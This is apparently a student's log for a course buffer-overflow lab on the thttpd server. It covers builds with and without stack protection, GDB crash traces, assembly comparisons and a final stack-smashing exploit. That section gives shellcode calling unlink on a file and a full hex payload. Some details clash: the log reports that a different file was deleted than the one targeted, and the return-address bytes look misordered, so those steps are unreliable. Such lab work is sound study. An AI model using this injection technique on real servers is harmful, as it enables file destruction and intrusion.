@@ -1,0 +1,215 @@
+1. Ran which gcc to check if the PATH was correct. It was not, so ran command
+PATH=/usr/local/cs/bin:$PATH: export PATH to correct it, and then which gcc 
+again to confirm that it worked.
+
+2. wget https://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
+to download the resource. tar -xzf sthttpd-2.27.0.tar.gz to unzip.
+Ran the given configure command, and then applied the given patch using 
+patch -p0 < patchfile.txt . Then compiled (3 times) according to the spec. 
+
+3. Calculated my port numbers: (12349,12350,12351)
+For SP: src/thttpd-sp -p 12349 -D
+For AS: src/thttpd-as -p 12350 -D
+For NO: src/thttpd-no -p 12351 -D
+
+4. Created a file foo.txt containing the text "hi". Then ran the following 
+commands to ensure that each version of thttpd works.
+For SP: curl http://localhost:12349/foo.txt
+For AS: curl http://localhost:12350/foo.txt
+For NO: curl http://localhost:12351/foo.txt
+
+Note: For AS, I initially got the following error:
+src/thttpd-as: error while loading shared libraries: \
+libasan.so.5: wrong ELF class: ELFCLASS32 .
+I fixed this by recompiling thttpd-as with the additional flag -static-libasan
+
+5. To make SP crash, I changed foo.txt so that it contained more than 100
+characters.
+Next I ran in GDB:
+gdb src/thttpd-sp
+(gdb) r -p 12349 -D -C foo.txt
+Running this resulted in the *** stack smashing detected *** message, followed
+by:
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+
+(gdb) bt 
+Getting a backtrace output:
+#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404165 in read_config (filename=<optimized out>)
+    at thttpd.c:1129
+#7  0x6968696869686968 in ?? ()
+#8  0x0000000069686968 in ?? ()
+#9  0x00007fffffffce60 in ?? ()
+#10 0x00007fffffffe008 in ?? ()
+#11 0x00007fffffffcde0 in ?? ()
+#12 0x00007fffffffe000 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+This shows that is crashed at 0x0000000000404165 (#6).
+
+(gdb) disas 0x0000000000404165
+Disassemble at this address.
+We eventually find the instruction
+0x0000000000404160 <+1424>:	callq  0x4023f0 <__stack_chk_fail@plt>
+where there is a function called <__stack_chk_fail@plt>. This is the instruction
+at which the program crashed, due to the stack becoming "smashed"/corrupted and
+failing the function call.
+
+6. To make AS crash, I used the same foo.txt as in Step 5.
+Run in GDB:
+gdb src/thttpd-as
+(gdb) r -p 12350 -D -C foo.txt
+Running results in this error:
+==13488==ERROR: AddressSanitizer: stack-buffer-overflow on \
+address 0x7fffffffcba4 at pc 0x00000048a72c bp 0x7fffffffcb00 sp 0x7fffffffc2b0
+READ of size 166 at 0x7fffffffcba4 thread T0
+
+(gdb) bt
+Backtrace output:
+No Stack
+Note: The file foo.txt seemed to cause a memory error when the stack/buffer
+overflow occurred, so GDB immediately aborted, and I was unable to obtain any
+backtraces.
+
+7. To make NO crash, I used the same foo.txt as in Steps 5 and 6.
+Run in GDB:
+gdb src/thttpd-no
+(gdb) r -p 12351 -D -C foo.txt
+Running results in this error:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+1189	    (void) fclose( fp );
+
+(gdb) bt
+Backtrace output:
+#0  0x0000000000403f79 in read_config (filename=<optimized out>)
+    at thttpd.c:1189
+#1  0x6968696869686968 in ?? ()
+#2  0x0000000069686968 in ?? ()
+#3  0x00007fffffffce60 in ?? ()
+#4  0x00007fffffffe008 in ?? ()
+#5  0x00007fffffffcde0 in ?? ()
+#6  0x00007fffffffe000 in ?? ()
+#7  0x0000000000000000 in ?? ()
+
+Upon inspection, we find that the function reaches the return instruction in 
+this case. This happens because no flags were used in compilation that would
+allow the program to detect stack/buffer overflows, so it simply keeps running
+with the corrupted stack. This is dangerous for the program because it can
+access/change data that isn't meant to be altered.
+
+8. To generate assembly code for thttpd.c using gcc -S:
+
+[SP]
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+[AS]
+make clean
+make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+mv src/thttpd.o src/thttpd-as.s
+
+[NO]
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+Command: wc -l *.s (used to see line count (i.e. approx insn count) for each)
+Output:
+ 10205 thttpd-as.s
+  4423 thttpd-no.s
+  4465 thttpd-sp.s
+ 19093 total
+
+It is evident that the AS version uses many more instructions than the other 2.
+This also holds true for the files' implementations of handle_read().
+AS involves so much more instruction becuase it does a lot of bad memory 
+checking. SP has a few more instructions than NO because it does simple checks
+for stack/buffer overflow.
+
+9. 
+Created a file called test.txt
+
+gdb src/thttpd-no 
+Start GDB.
+
+(gdb) b read_config
+Set breakpoint at buggy function.
+
+(gdb) r -p 12351 -D -C test.txt
+Run program.
+
+(gdb) print &line
+Want to find address of the target array.
+Output:
+$1 = (char (*)[100]) 0x7fffffffccd0
+
+(gdb) i r $rsp
+Want to find address of stack pointer (points to beginning of read_config
+right now)
+Output:
+rsp            0x7fffffffcd68      0x7fffffffcd68
+Evaluate 0x7fffffffcd68 - 0x7fffffffccd0 = 152 bytes. This is the number of
+bytes between the beginning of the read buffer and the return address.
+
+[IN SHELL] printf "victim.txt" | xxd
+Get hex dump of the string "victim.txt". Add 00 at the end for null byte of a 
+char array.
+Output:
+0000000: 7669 6374 696d 2e74 7874                 victim.txt
+[after adding 00]:
+76 69 63 74 69 6d 2e 74 78 74 00 (11 bytes)
+
+[IN SHELL] printf "port=" | xxd
+Also need hex of this, output:
+0000000: 706f 7274 3d                             port=
+
+Created an assembly code file exploit.s with the contents:
+(first mov uses address of $rsp + 8)
+    mov $0x7fffffffcd70, %rdi
+    mov $0x57, %rax
+    syscall
+
+To view the assembly code of exploit.s:
+gcc -c exploit.s
+objdump -d exploit.o
+
+Output:
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 bf 70 cd ff ff ff 	movabs $0x7fffffffcd70,%rdi
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05                	syscall 
+This gives 19 bytes, which correspond to the actual unlinking/deleting of file.
+
+Now to put together the final file exploit.txt (fill in middle with null bytes):
+70 6f 72 74 3d 00 00 00 48 bf 70 cd ff ff ff 7f
+00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 76 69 63 74 69 6d 2e 74
+78 74 00 00 00 00 00 00 7f ff ff ff cd 58 00 00
+
+I then converted this hex file into an ascii format using the command:
+xxd -r exploit.txt exploit_ascii.txt
+
+Finally, I ran the following commands for GDB:
+gdb thttpd-no
+(gdb) r -p 12351 -D -C exploit_ascii.txt
+
+The file exploit_ascii.txt now disappeared from its directory, so the exploit
+was successful.
